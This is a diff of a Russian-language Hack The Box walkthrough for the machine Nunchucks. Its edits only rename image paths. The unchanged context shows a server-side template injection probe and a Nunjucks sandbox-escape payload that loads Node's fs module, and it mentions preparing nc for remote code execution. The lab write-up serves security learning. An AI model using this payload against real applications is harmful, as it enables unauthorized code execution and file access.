@@ -1,6 +1,6 @@
 # 🟢 Nunchucks(Linux, Easy)
 
-![](<../.gitbook/assets/1 (1).png>)
+![](<../.gitbook/assets/1 (1) (1).png>)
 
 ### Содержание:
 
@@ -60,9 +60,9 @@ $ sudo vim /etc/hosts
 
 ### Эксплуатируем SSTI в Nunchucks:
 
-![](../.gitbook/assets/3.png)
+![](<../.gitbook/assets/3 (1).png>)
 
-![](<../.gitbook/assets/4 (1) (1).png>)
+![](<../.gitbook/assets/4 (1) (1) (1).png>)
 
 На поддомене есть `SSTI(Server Side Template Injection)` уязвимость. Дальше `{% raw %}{{7*7}}{% endraw %}` продвинуться не удавалось, но имя машины дает некоторый хинт. `Nunjucks` - это шаблонизатор для `Jinja2`, используемый для разработки веб-приложений на веб-фреймворках `Node.js`, таких как `Express` или `Connect`. Найдя [пэйлоад](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine), пытаемся его эксплуатировать:
 
@@ -70,7 +70,7 @@ $ sudo vim /etc/hosts
 {% raw %}{{range.constructor("return global.process.mainModule.require('fs')")()}}{% endraw %}
 ```
 
-![](<../.gitbook/assets/5 (1).png>)
+![](<../.gitbook/assets/5 (1) (1).png>)
 
 Чтобы эксплуатировать `RCE`, нужно поставить nc и запустить пэйлоад:
 
